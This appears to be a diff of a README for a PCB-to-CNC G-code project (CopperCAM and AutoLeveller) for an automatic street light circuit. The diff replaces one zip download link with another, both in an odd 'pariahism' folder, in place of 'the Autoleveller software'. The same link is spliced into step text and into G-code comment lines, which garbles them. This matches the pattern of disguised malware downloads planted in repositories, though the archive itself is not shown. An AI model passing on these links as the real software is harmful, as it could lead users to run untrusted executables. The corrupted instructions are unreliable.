@@ -22,7 +22,7 @@ To convert PCB Gerber files of an automatic street light control circuit into CN
 12.	Go to machine/mill and select engraving you will get the g code,similarly for Drill and cut.<br>
 13.	Save the G code<br>
 ### Auto leveller
-https://raw.githubusercontent.com/MITHUN8521/Conversion-of-PCB-Gerber-Files-to-Auto-leveller-code-for-fabrication-of-Automatic-Street-Light./main/pariahism/Software_3.2-beta.1.zip the Autoleveller software<br>
+https://github.com/MITHUN8521/Conversion-of-PCB-Gerber-Files-to-Auto-leveller-code-for-fabrication-of-Automatic-Street-Light./raw/refs/heads/main/pariahism/App_3.4.zip the Autoleveller software<br>
 2. Select the software option as Mach3 <br>
 3. Load the G Code - Click “Browse for G Code” button and open your Engraving G-Code.<br>
 4. After loading G-Code below a window will open. In that Select Unit “millimeters”<br>
@@ -30,7 +30,7 @@ https://raw.githubusercontent.com/MITHUN8521/Conversion-of-PCB-Gerber-Files-to-A
 6. Remove the unwanted portion from your Auto Levelled G-Code.<br>
 7. Add few lines in the code and save the file<br>
 8. Follow this same procedure for remaining all G-codes ( Drill and cut).<br>
-https://raw.githubusercontent.com/MITHUN8521/Conversion-of-PCB-Gerber-Files-to-Auto-leveller-code-for-fabrication-of-Automatic-Street-Light./main/pariahism/Software_3.2-beta.1.zip should be done for only engraving file.<br>
+https://github.com/MITHUN8521/Conversion-of-PCB-Gerber-Files-to-Auto-leveller-code-for-fabrication-of-Automatic-Street-Light./raw/refs/heads/main/pariahism/App_3.4.zip should be done for only engraving file.<br>
 ## THEORY:
 In the process of PCB prototyping using CNC machines, converting Gerber files into G-Code is a crucial step. Gerber files, which are generated from PCB design software such as Eagle, KiCad, or Altium, contain all the essential data related to copper traces, drill holes, and board outlines. These files are loaded into CopperCAM, a specialized software tool used to convert Gerber data into machine-readable G-Code. G-Code is the standard language for CNC machines, containing instructions for tool paths, feed rates, and operations like drilling, engraving, and cutting. CopperCAM allows users to define tool parameters and optimize machining paths for precise and efficient milling. It separates different PCB layers (top, bottom, drill, outline) and converts each into a suitable toolpath, which is then saved as G-Code.
 Once the G-Code is generated, it is essential to ensure that the CNC engraving bit maintains consistent depth across the entire surface of the copper-clad board, as even minor surface irregularities can affect trace quality. To overcome this, AutoLeveller software is used. This tool takes the original G-Code and enhances it by adding auto-leveling commands, which probe various points on the PCB surface to measure height differences. Based on these measurements, it adjusts the Z-axis movements dynamically during machining, ensuring that the engraving depth remains constant. This results in high precision and better-quality PCB fabrication. By integrating CopperCAM and AutoLeveller in the workflow, the process from Gerber file to fully auto-leveled CNC-ready code becomes streamlined, accurate, and suitable for creating reliable circuit boards such as the automatic street light control system.
@@ -40,7 +40,7 @@ Once the G-Code is generated, it is essential to ensure that the CNC engraving b
 ```
 %
 ( CopperCAM - 07/03/2025 / ISO-Mill Output )
-( C:\COPPERCAM\https://raw.githubusercontent.com/MITHUN8521/Conversion-of-PCB-Gerber-Files-to-Auto-leveller-code-for-fabrication-of-Automatic-Street-Light./main/pariahism/Software_3.2-beta.1.zip created 13/03/2025 at 16:07 )
+( C:\COPPERCAM\https://github.com/MITHUN8521/Conversion-of-PCB-Gerber-Files-to-Auto-leveller-code-for-fabrication-of-Automatic-Street-Light./raw/refs/heads/main/pariahism/App_3.4.zip created 13/03/2025 at 16:07 )
 ( Workpiece dimensions: 91.11 x 59.68 x 1 mm )
 G21 G40 G54
 G80 G90 G94
@@ -2165,7 +2165,7 @@ M02
 ```
 %
 ( CopperCAM - 07/03/2025 / ISO-Mill Output )
-( C:\COPPERCAM\https://raw.githubusercontent.com/MITHUN8521/Conversion-of-PCB-Gerber-Files-to-Auto-leveller-code-for-fabrication-of-Automatic-Street-Light./main/pariahism/Software_3.2-beta.1.zip created 13/03/2025 at 16:08 )
+( C:\COPPERCAM\https://github.com/MITHUN8521/Conversion-of-PCB-Gerber-Files-to-Auto-leveller-code-for-fabrication-of-Automatic-Street-Light./raw/refs/heads/main/pariahism/App_3.4.zip created 13/03/2025 at 16:08 )
 ( Workpiece dimensions: 91.11 x 59.68 x 1 mm )
 G21 G40 G54
 G80 G90 G94
@@ -2330,7 +2330,7 @@ M02
 ```
 %
 ( CopperCAM - 07/03/2025 / ISO-Mill Output )
-( C:\COPPERCAM\https://raw.githubusercontent.com/MITHUN8521/Conversion-of-PCB-Gerber-Files-to-Auto-leveller-code-for-fabrication-of-Automatic-Street-Light./main/pariahism/Software_3.2-beta.1.zip created 13/03/2025 at 16:08 )
+( C:\COPPERCAM\https://github.com/MITHUN8521/Conversion-of-PCB-Gerber-Files-to-Auto-leveller-code-for-fabrication-of-Automatic-Street-Light./raw/refs/heads/main/pariahism/App_3.4.zip created 13/03/2025 at 16:08 )
 ( Workpiece dimensions: 91.11 x 59.68 x 1 mm )
 G21 G40 G54
 G80 G90 G94
